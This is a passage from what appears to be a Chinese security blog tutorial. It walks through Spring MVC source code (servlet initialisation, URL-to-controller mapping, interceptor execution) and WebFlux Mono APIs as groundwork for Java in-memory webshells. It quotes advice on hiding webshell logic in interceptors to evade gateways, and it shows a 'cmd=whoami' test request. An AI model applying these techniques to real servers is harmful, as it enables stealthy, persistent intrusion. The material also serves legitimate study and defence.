class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set bean properties from init parameters.</span></span><br><span class="line">    <span class="type">PropertyValues</span> <span class="variable">pvs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletConfigPropertyValues</span>(getServletConfig(), <span class="built_in">this</span>.requiredProperties);</span><br><span class="line">    <span class="keyword">if</span> (!pvs.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">BeanWrapper</span> <span class="variable">bw</span> <span class="operator">=</span> PropertyAccessorFactory.forBeanPropertyAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="type">ResourceLoader</span> <span class="variable">resourceLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletContextResourceLoader</span>(getServletContext());</span><br><span class="line">            bw.registerCustomEditor(Resource.class, <span class="keyword">new</span> <span class="title class_">ResourceEditor</span>(resourceLoader, getEnvironment()));</span><br><span class="line">            initBeanWrapper(bw);</span><br><span class="line">            bw.setPropertyValues(pvs, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (BeansException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (logger.isErrorEnabled()) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;Failed to set bean properties on servlet &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Let subclasses do whatever initialization they like.</span></span><br><span class="line">    initServletBean();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先是从<code>Servlet</code>的配置中获取初始化参数并创建一个<code>PropertyValues</code>对象，然后设置<code>Bean</code>属性；关键在最后一步，调用了<code>initServletBean</code>这个方法。</p><p>我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候<code>override</code>了该方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154412364.png"></p><p>果不其然，我们在<code>org.springframework.web.servlet.FrameworkServlet</code>中成功找到了该方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118154436747.png"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">initServletBean</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    getServletContext().log(<span class="string">&quot;Initializing Spring &quot;</span> + getClass().getSimpleName() + <span class="string">&quot; &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Initializing Servlet &#x27;&quot;</span> + getServletName() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.webApplicationContext = initWebApplicationContext();</span><br><span class="line">        initFrameworkServlet();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (ServletException | RuntimeException ex) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Context initialization failed&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.enableLoggingRequestDetails ?</span><br><span class="line">                <span class="string">&quot;shown which may lead to unsafe logging of potentially sensitive data&quot;</span> :</span><br><span class="line">                <span class="string">&quot;masked to prevent unsafe logging of potentially sensitive data&quot;</span>;</span><br><span class="line">        logger.debug(<span class="string">&quot;enableLoggingRequestDetails=&#x27;&quot;</span> + <span class="built_in">this</span>.enableLoggingRequestDetails +</span><br><span class="line">                <span class="string">&quot;&#x27;: request parameters and headers will be &quot;</span> + value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (logger.isInfoEnabled()) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;Completed initialization in &quot;</span> + (System.currentTimeMillis() - startTime) + <span class="string">&quot; ms&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的<code>log</code>和计时部分就不说了，我们捡关键的说。它先是调用<code>initWebApplicationContext</code>方法，初始化<code>IOC</code>容器，在初始化的过程中，会调用到这个<code>onRefresh</code>方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118155901114.png"></p><p>跟入该方法，可以看到其中默认为空：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160618786.png"></p><p>说明在它的子类中应该会有<code>override</code>，果然我们定位到了<code>org.springframework.web.servlet.DispatcherServlet#</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118160730953.png"></p><p>这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了<code>Spring MVC</code>的九大组件的初始化。</p><h4 id="2-11-2-2-url和Controller的关系的建立"><a href="#2-11-2-2-url和Controller的关系的建立" class="headerlink" title="2.11.2.2 url和Controller的关系的建立"></a>2.11.2.2 url和Controller的关系的建立</h4><p>你可能会有这样的一个疑惑：我们是用<code>@RequestMapping(&quot;/&quot;)</code>注解在方法上的，那<code>Spring MVC</code>是怎么根据这个注解就把对应的请求和这个方法关联起来的？</p><p>从上面的九大组件的初始化中可以看到，有个方法就叫做<code>initHandlerMappings</code>，我们点进去详细看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118170255776.png"></p><p>这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去<code>ApplicationContext</code>（包括<code>ancestor contexts</code>）里面找所有实现了<code>HandlerMappings</code>接口的类，如果找到了至少一个符合条件的<code>HandlerMapping bean</code>，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 <code>this.handlerMappings</code>；那如果没有找到，<code>this.handlerMappings</code>就依然保持为<code>null</code>；如果不需要检测所有处理程序映射，那就尝试从<code>ApplicationContext</code>中获取名称为 <code>handlerMapping</code> 的<code>bean</code>，如果成功获取到了则将其作为单一元素的列表赋值给 <code>this.handlerMappings</code>，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的<code>HandlerMapping</code>，这也就是我们要讲的第二部分的代码。</p><p>第二部分说的是，如果之前一套操作下来，<code>this.handlerMappings</code>还是为<code>null</code>，那么就调用 <code>getDefaultStrategies</code> 方法去获取默认的<code>HandlerMapping</code>，并将其赋给 <code>this.handlerMappings</code>。</p><p>这么一看的话，<code>org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies</code>这个方法还是挺关键的，我们点进去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118172033745.png"></p><p>这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在<code>defaultStrategies</code>中；接下来从<code>strategyInterface</code>获取一个名称，然后用这个名称在<code>defaultStrategies</code>中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过<code>ClassUtils.forName</code>方法加载该类 ②使用<code>createDefaultStrategy</code>方法创建该类的实例；最后将创建的策略对象添加到列表<code>strategies</code>中并返回。</p><p>那就很好奇了，这段代码中的<code>DEFAULT_STRATEGIES_PATH</code>里面有啥？<code>Ctrl+左键</code>追踪：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174426118.png"></p><p>原来是一个名叫<code>DispatcherServlet.properties</code>的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和<code>DispatcherServlet.java</code>在一块儿的：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174523396.png"></p><p>从文件内容中，我们可以很快地锁定关键信息：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">org.springframework.web.servlet.HandlerMapping</span>=<span class="string">org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\</span></span><br><span class="line"><span class="string">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\</span></span><br><span class="line"><span class="string">org.springframework.web.servlet.function.support.RouterFunctionMapping</span></span><br></pre></td></tr></table></figure><p>也就是说，会有三个值，分别是<code>BeanNameUrlHandlerMapping</code>、<code>RequestMappingHandlerMapping</code>和<code>RouterFunctionMapping</code>，我们一般用的是第二个，我们点进<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>看一下：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118174955839.png"></p><p>它的父类<code>RequestMappingInfoHandlerMapping</code>的父类<code>AbstractHandlerMethodMapping</code>实现了<code>InitializingBean</code>这个接口，这个接口用于在<code>bean</code>初始化完成后执行一些特定的自定义初始化逻辑。</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175247104.png"></p><p>点进该接口，只有一个<code>afterPropertiesSet</code>方法，关于该方法的用途可以参考<code>https://www.python100.com/html/U711CO7MV79C.html</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118175806150.png"></p><p>那我们就看看<code>AbstractHandlerMethodMapping</code>它是具体咋实现<code>InitializingBean</code>的<code>afterPropertiesSet</code>的吧：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180208640.png"></p><p>重写的也很简单，调用<code>initHandlerMethods</code>这个方法，继续跟踪该方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118180258066.png"></p><p>注释里面写的很清楚：扫描<code>ApplicationContext</code>中的<code>bean</code>，然后检测并注册<code>handler methods</code>。</p><p>我们在<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods</code>这里打下断点进行调试，到图中这一步之后<code>step into</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191019570.png"></p><p>我们来看<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean</code>这个方法的具体逻辑：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191122592.png"></p><p>这里我们自然很好奇，这个<code>isHandler</code>是判断啥的，我们点进去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118191924946.png"></p><p>可以看到，这里并没有给出实现，说明子类中应该会给出<code>override</code>，于是直接找到了<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192146352.png"></p><p>很明显，<code>isHandler</code>是用来检测给定的<code>beanType</code>类是否带有<code>Controller</code>注解或者<code>RequestMapping</code>注解。</p><p>解决了这个，继续往后看，后面是调用了<code>detectHandlerMethods</code>这个方法，我们点进去看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118192734772.png"></p><p>我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断<code>handler</code>是否是字符串类型，如果是，则通过<code>ApplicationContext</code>获取它的类型；否则，直接获取<code>handler</code>的类型。：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; handlerType = (handler <span class="keyword">instanceof</span> String ?</span><br><span class="line">            obtainApplicationContext().getType((String) handler) : handler.getClass());</span><br></pre></td></tr></table></figure><p>然后是这部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line">Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType,</span><br><span class="line">        (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> getMappingForMethod(method, userType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> +</span><br><span class="line">                        userType.getName() + <span class="string">&quot;]: &quot;</span> + method, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个<code>selectMethods</code>方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用<code>getMappingForMethod</code>来获取方法的映射信息。</p><p>我们点进这个方法，发现它是一个抽象方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118193938936.png"></p><p>那就去看看他的子类中有没有对应的实现，直接定位到<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118194251185.png"></p><p>我们在下图所示位置打断点调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195411713.png"></p><p>分开来看，首先是第一行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> createRequestMappingInfo(method);</span><br></pre></td></tr></table></figure><p>解析<code>Controller</code>类的方法中的注解，生成一个对应的<code>RequestMappingInfo</code>对象。我们可以<code>step into</code>进入<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195804561.png"></p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118195850878.png"></p><p>可以看到这个<code>info</code>里面保存了访问该方法的<code>url pattern</code>是<code>&quot;/&quot;</code>，也就是我们在<code>TestController.java</code>所想要看到的当<code>@RequestMapping(&quot;/&quot;)</code>时，调用<code>test</code>方法。</p><p>继续一步步往下走，可以看到走到了<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods</code>的最后：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118200254342.png"></p><p>直接看<code>lambda</code>表达式里面的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">registerHandlerMethod(handler, invocableMethod, mapping);</span><br></pre></td></tr></table></figure><p>意思是，先用<code>selectInvocableMethod</code>方法根据<code>method</code>和<code>userType</code>选择出一个可调用的方法，这样是为了处理可能存在的代理和<code>AOP</code>的情况，确保获取到的是可直接调用的原始方法；然后把<code>bean</code>、<code>Method</code>和<code>RequestMappingInfo</code>注册进<code>MappingRegistry</code>。</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240118201648822.png"></p><p>到这里，<code>url</code>和<code>Controller</code>之间的关系是如何建立的问题就解决了。</p><h4 id="2-11-2-3-Spring-Interceptor引入与执行流程分析"><a href="#2-11-2-3-Spring-Interceptor引入与执行流程分析" class="headerlink" title="2.11.2.3 Spring Interceptor引入与执行流程分析"></a>2.11.2.3 Spring Interceptor引入与执行流程分析</h4><p>我们回顾之前聊到的<code>Controller</code>的思路和下面的<code>4.1</code>节中所展示的<code>Controller</code>内存马，可以考虑到这样一个问题：</p><blockquote><p>随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的<code>shell</code>路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入<code>java</code>内存马时，尽量不要使用新的路由来专门处理我们注入的<code>webshell</code>逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们<code>webshell</code>逻辑的处理。在<code>tomcat</code>容器下，有<code>filter</code>、<code>listener</code>等技术可以达到上述要求。那么在 <code>spring</code> 框架层面下，有办法达到上面所说的效果吗？      ——摘编自<code>https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md</code>和<code>https://landgrey.me/blog/19/</code></p></blockquote><p>答案是当然有，这就是我们要讲的<code>Spring Interceptor</code>，<code>Spring</code>框架中的一种拦截器机制。</p><p>那就不禁要问了：这个<code>Spring Interceptor</code>和我们之前所说的<code>Filter</code>的区别是啥？</p><blockquote><p>参考：<a href="https://developer.aliyun.com/article/925400">https://developer.aliyun.com/article/925400</a></p></blockquote><p>主要有以下六个方面：</p><table><thead><tr><th>主要区别</th><th>拦截器</th><th>过滤器</th></tr></thead><tbody><tr><td>机制</td><td><code>Java</code>反射机制</td><td>函数回调</td></tr><tr><td>是否依赖<code>Servlet</code>容器</td><td>不依赖</td><td>依赖</td></tr><tr><td>作用范围</td><td>对<code>action</code>请求起作用</td><td>对几乎所有请求起作用</td></tr><tr><td>是否可以访问上下文和值栈</td><td>可以访问</td><td>不能访问</td></tr><tr><td>调用次数</td><td>可以多次被调用</td><td>在容器初始化时只被调用一次</td></tr><tr><td><code>IOC</code>容器中的访问</td><td>可以获取<code>IOC</code>容器中的各个<code>bean</code>（基于<code>FactoryBean</code>接口）</td><td>不能在<code>IOC</code>容器中获取<code>bean</code></td></tr></tbody></table><p>我们在<code>2.10.2</code>节中给出的<code>TestInterceptor.java</code>的<code>preHandle</code>函数这里下断点，然后访问<code>http://127.0.0.1:8080/?cmd=whoami</code>进入调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119210645412.png"></p><p>一步步步入调试之后，发现进入<code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code>方法：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211041073.png"></p><p>我们在<code>doDispatch</code>方法的第一行下断点，重新访问页面调试：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119211454480.png"></p><p>看到了调用了<code>getHandler</code>这个函数，它的注释写的简单易懂：确定处理当前请求的<code>handler</code>，我们<code>step into</code>看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213144754.png"></p><p>通过遍历当前<code>handlerMapping</code>数组中的<code>handler</code>对象，来判断哪个<code>handler</code>来处理当前的<code>request</code>对象：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119213521627.png"></p><p>继续步入这个函数里面所用到的<code>mapping.getHandler</code>方法，也就是<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code>：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119214714153.png"></p><p>代码简单易懂，先是通过<code>getHandlerInternal</code>来获取，如果获取不到，那就调用<code>getDefaultHandler</code>来获取默认的，如果还是获取不到，就直接返回<code>null</code>；然后检查<code>handler</code>是不是一个字符串，如果是，说明可能是一个<code>Bean</code>的名字，这样的话就通过<code>ApplicationContext</code>来获取对应名字的<code>Bean</code>对象，这样就确保 <code>handler</code> 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 <code>initLookupPath(request)</code> 方法来初始化请求路径的查找；最后通过 <code>getHandlerExecutionChain</code> 方法创建一个处理器执行链。</p><p>这么看下来，这个<code>getHandlerExecutionChain</code>方法很重要，我们步入看看：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119220340092.png"></p><p>遍历<code>adaptedInterceptors</code>，判断拦截器是否是<code>MappedInterceptor</code>类型，如果是那就看<code>MappedInterceptor</code>是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。</p><p>再回到之前的<code>getHandler</code>方法中来，看看它的后半段：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223022260.png"></p><p>主要都是处理跨域资源共享（<code>CORS</code>）的逻辑，只需要知道在涉及<code>CORS</code>的时候把<code>request</code>、<code>executionChain</code>和<code>CORS</code>配置通过<code>getCorsHandlerExecutionChain</code>调用封装后返回就行了。</p><p>一步步执行回到一开始的<code>getHandler</code>中，这里就是调用<code>org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle</code>方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了：</p><p><img src="https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240119223829102.png"></p><h2 id="2-12-Spring-WebFlux介绍与代码调试分析"><a href="#2-12-Spring-WebFlux介绍与代码调试分析" class="headerlink" title="2.12 Spring WebFlux介绍与代码调试分析"></a>2.12 Spring WebFlux介绍与代码调试分析</h2><p><code>SpringWebFlux</code>是<code>Spring Framework 5.0</code>中引入的新的响应式<code>web</code>框架。传统的<code>Spring MVC</code>在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，<code>WebFlux</code>引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和<code>WebSocket</code>，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，<code>WebFlux</code>可以更好地适应这种异步通信的需求。</p><p>关于<code>Reactive</code>和<code>Spring WebFlux</code>的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻：</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/559158740">https://zhuanlan.zhihu.com/p/559158740</a></p></blockquote><p><code>WebFlux</code>框架开发的接口返回类型必须是<code>Mono&lt;T&gt;</code>或者是<code>Flux&lt;T&gt;</code>。因此我们第一个需要了解的就是什么是<code>Mono</code>以及什么是<code>Flux</code>。</p><h3 id="2-12-1-什么是Mono？"><a href="#2-12-1-什么是Mono？" class="headerlink" title="2.12.1 什么是Mono？"></a>2.12.1 什么是Mono？</h3><p><code>Mono</code>用来表示包含<code>0</code>或<code>1</code>个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在<code>Mono</code>中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在<code>2.10.3</code>节中的那张<code>gif</code>图中所看到的那样。</p><p>下面我们来看看<code>Mono</code>常用的<code>api</code>：</p><table><thead><tr><th align="center">API</th><th align="center">说明</th><th align="center">代码示例</th></tr></thead><tbody><tr><td align="center"><code>Mono.just(T data)</code></td><td align="center">创建一个包含指定数据的 <code>Mono</code>。</td><td align="center"><code>Mono&lt;String&gt; mono = Mono.just(&quot;Hello, Mono!&quot;);</code></td></tr><tr><td align="center"><code>Mono.empty()</code></td><td align="center">创建一个空的 <code>Mono</code>。</td><td align="center"><code>Mono&lt;Object&gt; emptyMono = Mono.empty();</code></td></tr><tr><td align="center"><code>Mono.error(Throwable error)</code></td><td align="center">创建一个包含错误的 <code>Mono</code>。</td><td align="center"><code>Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException(&quot;Something went wrong&quot;));</code></td></tr><tr><td align="center"><code>Mono.fromCallable(Callable&lt;T&gt; supplier)</code></td><td align="center">从 Callable 创建 <code>Mono</code>，表示可能抛出异常的异步操作。</td><td align="center"><code>Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation());</code></td></tr><tr><td align="center"><code>Mono.fromRunnable(Runnable runnable)</code></td><td align="center">从 Runnable 创建 <code>Mono</code>，表示没有返回值的异步操作。</td><td align="center"><code>Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask());</code></td></tr><tr><td align="center"><code>Mono.delay(Duration delay)</code></td><td align="center">在指定的延迟后创建一个空的 <code>Mono</code>。</td><td align="center"><code>Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just(&quot;Delayed Result&quot;));</code></td></tr><tr><td align="center"><code>Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier)</code></td><td align="center">延迟创建 <code>Mono</code>，直到订阅时才调用供应商方法。</td><td align="center"><code>Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just(&quot;Deferred Result&quot;));</code></td></tr><tr><td align="center"><code>Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos)</code></td><td align="center">将一组 <code>Mono</code> 合并为一个 <code>Mono</code>，当其中一个出错时，继续等待其他的完成。</td><td align="center"><code>Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3));</code></td></tr><tr><td align="center"><code>Mono.map(Function&lt;? super T, ? extends V&gt; transformer)</code></td><td align="center">对 <code>Mono</code> 中的元素进行映射。</td><td align="center"><code>Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length());</code></td></tr><tr><td align="center"><code>Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer)</code></td><td align="center">对 <code>Mono</code> 中的元素进行异步映射。</td><td align="center"><code>Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length()));</code></td></tr><tr><td align="center"><code>Mono.filter(Predicate&lt;? super T&gt; tester)</code></td><td align="center">过滤 <code>Mono</code> 中的元素。</td><td align="center"><code>Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5);</code></td></tr><tr><td align="center"><code>Mono.defaultIfEmpty(T defaultVal)</code></td><td align="center">如果 <code>Mono</code> 为空，则使用默认值。</td><td align="center"><code>Mono&lt;String&gt; resultMono = mono.defaultIfEmpty(&quot;Default Value&quot;);</code></td></tr><tr><td align="center"><code>Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback)</code></td><td align="center">在发生错误时提供一个备用的 <code>Mono</code>。</td><td align="center"><code>Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just(&quot;Fallback Value&quot;));</code></td></tr><tr><td align="center"><code>Mono.doOnNext(Consumer&lt;? super T&gt; consumer)</code></td><td align="center">在成功时执行操作，但不更改元素。</td><td align="center"><code>Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println(&quot;Received: &quot; + s));</code></td></tr><tr><td align="center"><code>Mono.doOnError(Consumer&lt;? super Throwable&gt; onError)</code></td><td align="center">在发生错误时执行操作。</td><td align="center"><code>Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println(&quot;Error: &quot; + e.getMessage()));</code></td></tr><tr><td align="center"><code>Mono.doFinally(Consumer&lt;SignalType&gt; action)</code></td><td align="center">无论成功还是出错都执行操作。</td><td align="center"><code>Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println(&quot;Processing finished: &quot; + signal));</code></td></tr></tbody></table><h3 id="2-12-2-什么是Flux？"><a 